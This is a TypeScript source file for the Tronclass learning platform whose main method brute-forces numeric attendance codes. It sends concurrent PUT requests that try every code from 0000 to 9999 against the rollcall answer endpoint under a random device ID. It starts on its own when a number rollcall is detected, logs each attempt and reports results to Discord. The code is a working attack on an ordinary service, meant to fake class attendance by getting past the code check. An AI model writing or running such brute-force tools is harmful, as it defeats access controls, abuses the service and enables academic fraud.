import fetchCookie from "fetch-cookie";
import { CookieJar } from "tough-cookie";
import { JSDOM } from "jsdom";
//@ts-ignore
import { discordNotify } from "../example/notify.js";
import Tronclass from "./index.js";
import fs from "fs";
import path from "path";
import ProgressBar from "progress";

class Rollcall {
  private tronclass: Tronclass;
  private PATH = "./logs"; // 預設 log 目錄
  constructor(tron: Tronclass) {
    this.tronclass = tron;
  }
  private async log(
    filePath: string,
    resp: { url?: string; status?: number; data?: any; summary?: boolean; code?: string; [key: string]: any }, // <- 加上 code 和任意屬性
    cnt: number = -1
  ) {
    const timestamp = new Date().toISOString();
    const count = cnt ?? -1;

    let content = `${timestamp} | ${count}\n`;
    content += JSON.stringify(resp, null, 2) + "\n";

    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.appendFileSync(filePath, content, { encoding: "utf-8" });

    return true;
  }

  private randomId(length: number = 16): string {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }


  private async number(
    rcid: number,
    ses = 25,
    ran = 400,
    earlyStop = true // 找到正確碼就提前停止
  ): Promise<string> {
    let attempts = 0;
    let foundCode = "-1";
    const device = this.randomId();
    const totalPlanned = Math.min(10000, ses * ran); // 最多4位數(0000~9999)
    // === 進度條 ===
    const bar = new ProgressBar(":bar :percent (:current/:total)", {
      total: totalPlanned,
      width: 40,
    });

    const logPath = `${this.PATH}/num/${rcid}.log`;
    const log = (entry: any) => this.log(logPath, entry, rcid);

    // === 安全解析回應 ===
    const safeParse = async (resp: Response) => {
      const url = (resp as any).url ?? "";
      const ct = resp.headers.get("content-type") || "";
      const text = await resp.text();
      let parsed: any = null;

      if (ct.includes("application/json")) {
        try {
          parsed = JSON.parse(text);
        } catch {
          parsed = { raw: text.slice(0, 300) };
        }
      } else if (text.trim().startsWith("<")) {
        parsed = { html: true, head: text.slice(0, 300) };
      } else {
        try {
          parsed = JSON.parse(text);
        } catch {
          parsed = { raw: text.slice(0, 300) };
        }
      }

      return { url, ct, text, data: parsed };
    };

    // === 早停旗標 ===
    let found = false;

    // === Worker ===
    const inner = async (sesId: number) => {
      for (let i = 0; i < ran; i++) {
        if (found && earlyStop) break; // 已找到則不繼續新請求
        const idx = sesId * ran + i;
        if (idx >= 10000) break; // 超過4位數上限

        const numberCode = idx.toString().padStart(4, "0");
        const payload = { deviceId: device, numberCode };

        let resp: any;
        try {
          resp = await this.tronclass.call(
            `/api/rollcall/${rcid}/answer_number_rollcall`,
            {
              method: "PUT",
              body: JSON.stringify(payload),
              headers: {
                "Content-Type": "application/json",
                "Accept": "application/json",
              },
            }
          );

          const { url, ct, data, text } = await safeParse(resp);
          attempts += 1;
          if (attempts <= totalPlanned)
            bar.update(attempts / totalPlanned);

          // === 狀態分支 ===
          if (resp.status === 200) {
            foundCode = numberCode;
            found = true;
            await log({
              url,
              status: resp.status,
              ct,
              data,
              code: numberCode,
              note: "OK",
            });
            if (earlyStop) break;
          } else if (resp.status === 400) {
            await log({
              url,
              status: resp.status,
              ct,
              data,
              code: numberCode,
              note: "wrong code / 400",
            });
          } else {
            await log({
              url,
              status: resp.status,
              ct,
              head:
                typeof data === "object" && data?.html
                  ? data.head
                  : (text || "").slice(0, 300),
              code: numberCode,
              note: "non-200/400",
            });
          }
        } catch (e: any) {
            discordNotify(
              `⚠️ Rollcall Code Attempt Error: ${numberCode} (Rollcall ID: ${rcid})\nError: ${e?.message || String(e)}`
            );
          await log({
            url: resp?.url ?? "<no-url>",
            status: resp?.status ?? -1,
            code: numberCode,
            error: e?.message || String(e),
            note: "exception",
          });
          await new Promise((r) => setTimeout(r, 1200)); // 輕微退避
        }
      }
    };

    // === 啟動所有 worker ===
    const start = performance.now();
    await Promise.all(Array.from({ length: ses }, (_, i) => inner(i)));

    // === 總結 ===
    const spend = (performance.now() - start) / 1000;
    bar.terminate();
    discordNotify(
      `🎯 Rollcall Number Code Attempt Finished for Rollcall ID: ${rcid}\nTotal Spend: ${spend}s, Attempts: ${attempts}, Last Code: ${foundCode}`
    );
    console.log("🎯 Done!");
    console.log(
      `Total spend: ${spend}s, attempts: ${attempts}, last code: ${foundCode}`
    );

    await this.log(
      logPath,
      {
        summary: true,
        code: foundCode,
        spend_time: spend,
        attempts,
        opened_session: ses,
        request_per_session: ran,
        early_stop: !!earlyStop,
      },
      rcid
    );

    return foundCode;
  }

  public async checkRollcall(cnt = -1) {
    // 呼叫 rollcall API
    const resp = await this.tronclass.call(`/api/radar/rollcalls?api_version=1.1.0`);
    const json = await resp.json();

    // 取當日日期（用於 log 檔名）
    const today = new Date();
    const y = today.getFullYear();
    const m = today.getMonth() + 1; // JS 月份從 0 開始
    const d = today.getDate();

    // 記錄 API 回應
    await this.log(`${this.PATH}/${y}/${m}/${d}.log`, {
      url: resp.url,
      status: resp.status,
      data: json,
    },cnt);

    let status;

    // 根據 rollcall 狀態決定要做的事
    if (json.rollcalls && json.rollcalls.length > 0) {
      const rollcall = json.rollcalls[0];

      if (rollcall.status === "on_call_fine") {
        console.log("rollcalled");
        status = 0;
      } else if (rollcall.is_number) {
        console.log("start num");
        const id = rollcall.rollcall_id;
        discordNotify(`🔔 Detected Number Rollcall (ID: ${id}). Starting code attempts...`);
        await this.number(id);
        status = 1;
      } else if (rollcall.is_radar) {
        console.log("start loc");
        status = 2;
      } else {
        console.log("maybe qrcode");
        status = 3;
      }
    } else {
      console.log("not call");
      status = -1;
    }

    return status;
  }
}
export default Rollcall;